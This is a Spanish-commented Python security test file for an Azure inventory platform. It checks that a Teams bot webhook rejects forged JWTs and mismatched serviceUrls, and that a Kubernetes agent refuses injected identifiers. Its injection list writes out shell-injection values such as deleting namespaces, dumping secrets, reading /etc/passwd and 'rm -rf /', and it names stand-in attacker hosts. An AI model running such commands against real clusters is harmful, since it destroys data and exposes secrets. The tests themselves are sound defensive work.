"""
Pruebas de las dos puertas de entrada que no exige token de usuario.

La plataforma es de solo lectura sobre Azure y expone el inventario completo de
la organizacion. Dos caminos escapan al middleware de Entra ID y son los que se
verifican aqui:

1. `/api/teams/webhook`, que no puede pedir token de usuario porque lo invoca el
   servicio de Bot Framework. Su autenticacion es el JWT que Bot Framework firma
   en cada peticion; sin validarlo, cualquiera que conozca la URL obtiene el
   inventario y hace escribir al bot en el canal de Teams.

2. Los endpoints del agente de Kubernetes, que arman comandos `kubectl` y los
   ejecutan con AKS Run Command. Es el unico punto del sistema capaz de escribir
   en infraestructura, asi que los identificadores que llegan del cliente tienen
   que ser nombres de Kubernetes y nada mas.

Se usan dobles y tokens fabricados: ninguna prueba llama a Azure ni necesita
credenciales. Ejecutar con:

    ./.venv/bin/python3 tests/test_seguridad_endpoints.py
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

os.environ.setdefault("MICROSOFT_APP_ID", "00000000-0000-0000-0000-000000000001")
os.environ.setdefault("AZURE_TENANT_ID", "00000000-0000-0000-0000-000000000002")
os.environ.setdefault("BOT_AUTH_ENABLED", "true")

import jwt  # noqa: E402

from app.services import bot_auth  # noqa: E402
from app.services.k8s_service import K8sInputError, K8sService, _validar_nombre  # noqa: E402

APP_ID = os.environ["MICROSOFT_APP_ID"]
FUTURO = 9999999999


def _token(**claims) -> str:
    """Un JWT bien formado pero firmado con una clave que no es de Microsoft."""
    base = {"iss": bot_auth.BOTFRAMEWORK_ISSUER, "aud": APP_ID, "exp": FUTURO}
    base.update(claims)
    return "Bearer " + jwt.encode(base, "clave-de-prueba-que-no-es-de-microsoft-32b", algorithm="HS256")


# ---------------------------------------------------------------------------
# Webhook de Teams
# ---------------------------------------------------------------------------

def test_sin_cabecera_se_rechaza():
    try:
        bot_auth.validate_bot_token("")
    except bot_auth.BotAuthError as exc:
        assert "Authorization" in str(exc)
        return
    raise AssertionError("una peticion sin token no puede aceptarse")


def test_token_ilegible_se_rechaza():
    try:
        bot_auth.validate_bot_token("Bearer esto-no-es-un-jwt")
    except bot_auth.BotAuthError:
        return
    raise AssertionError("un token mal formado no puede aceptarse")


def test_emisor_desconocido_se_rechaza():
    """
    La llave publica se busca en el juego de llaves del emisor declarado. Un
    emisor ajeno no debe llegar siquiera a la comprobacion de firma.
    """
    try:
        bot_auth.validate_bot_token(_token(iss="https://atacante.example.com"))
    except bot_auth.BotAuthError as exc:
        assert "Emisor no reconocido" in str(exc)
        return
    raise AssertionError("un emisor ajeno no puede aceptarse")


def test_firma_ajena_se_rechaza():
    """
    Emisor correcto, audiencia correcta, expiracion valida: lo unico que falla es
    la firma. Es el caso de quien copia la forma de un token legitimo.
    """
    try:
        bot_auth.validate_bot_token(_token())
    except bot_auth.BotAuthError as exc:
        assert "Token invalido" in str(exc) or "signing key" in str(exc)
        return
    raise AssertionError("una firma que no es de Microsoft no puede aceptarse")


def test_service_url_debe_coincidir():
    """
    El claim `serviceurl` ata el token a la direccion a la que el bot respondera.
    Una actividad legitima reenviada con otro serviceUrl haria salir la respuesta
    —con datos del inventario— hacia un tercero.
    """
    legitimo = "https://smba.trafficmanager.net/emea/"
    claims = {"serviceurl": legitimo}

    # Mismo servicio, con y sin barra final: la actividad es la que dice el token.
    bot_auth.verificar_service_url(claims, legitimo)
    bot_auth.verificar_service_url(claims, legitimo.rstrip("/"))

    # Un token sin el claim no bloquea: no todos los canales lo emiten.
    bot_auth.verificar_service_url({}, legitimo)

    try:
        bot_auth.verificar_service_url(claims, "https://servidor-del-atacante.example.com")
    except bot_auth.BotAuthError as exc:
        assert "serviceUrl" in str(exc)
        return
    raise AssertionError("un serviceUrl distinto al del token no puede aceptarse")


# ---------------------------------------------------------------------------
# Agente de Kubernetes
# ---------------------------------------------------------------------------

INYECCIONES = [
    "mipod;kubectl delete ns produccion",
    "default && kubectl drain node-1",
    "$(kubectl get secrets -A -o yaml)",
    "`id`",
    "ns | cat /etc/passwd",
    "pod\nkubectl apply -f http://malicioso",
    "../../etc/passwd",
    "pod > /tmp/salida",
]


def test_identificadores_validos_se_aceptan():
    for valido in ["kube-system", "api-gateway-7d9f", "mi.servicio", "a1"]:
        assert _validar_nombre(valido, "pod") == valido


def test_inyecciones_se_rechazan():
    for mal in INYECCIONES:
        try:
            _validar_nombre(mal, "pod")
        except K8sInputError:
            continue
        raise AssertionError(f"identificador peligroso aceptado: {mal!r}")


def test_logs_de_pod_validan_sus_tres_identificadores():
    servicio = K8sService.__new__(K8sService)  # sin tocar Azure
    servicio.agent = None
    servicio.aks_client = None
    for campo, kwargs in [
        ("pod", {"pod_name": "x;rm -rf /", "namespace": "default"}),
        ("namespace", {"pod_name": "api", "namespace": "def;ault"}),
        ("container", {"pod_name": "api", "namespace": "default", "container": "c;x"}),
    ]:
        try:
            servicio.get_pod_logs(**kwargs)
        except K8sInputError as exc:
            assert campo in str(exc)
            continue
        raise AssertionError(f"get_pod_logs no valido el campo {campo}")


def test_ultima_barrera_antes_de_ejecutar():
    """
    Defensa en profundidad: aunque un valor externo se colara sin validar, el
    comando no debe salir hacia Run Command si trae metacaracteres de shell.
    """
    try:
        K8sService._assert_sin_metacaracteres("get pods -n default; kubectl delete ns x")
    except K8sInputError:
        return
    raise AssertionError("un comando con metacaracteres no puede ejecutarse")


def test_comandos_legitimos_pasan_la_barrera():
    for comando in [
        "get pods -A -o json",
        "get nodes -o json",
        "logs api-gateway -n kube-system --tail=100 --timestamps=true",
    ]:
        K8sService._assert_sin_metacaracteres(comando)


def main() -> int:
    pruebas = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    fallos = 0
    for prueba in pruebas:
        try:
            prueba()
            print(f"  PASA  {prueba.__name__}")
        except Exception as exc:  # noqa: BLE001
            fallos += 1
            print(f"  FALLA {prueba.__name__}: {exc}")
    print()
    print(f"{len(pruebas) - fallos}/{len(pruebas)} pruebas pasaron")
    return 1 if fallos else 0


if __name__ == "__main__":
    sys.exit(main())
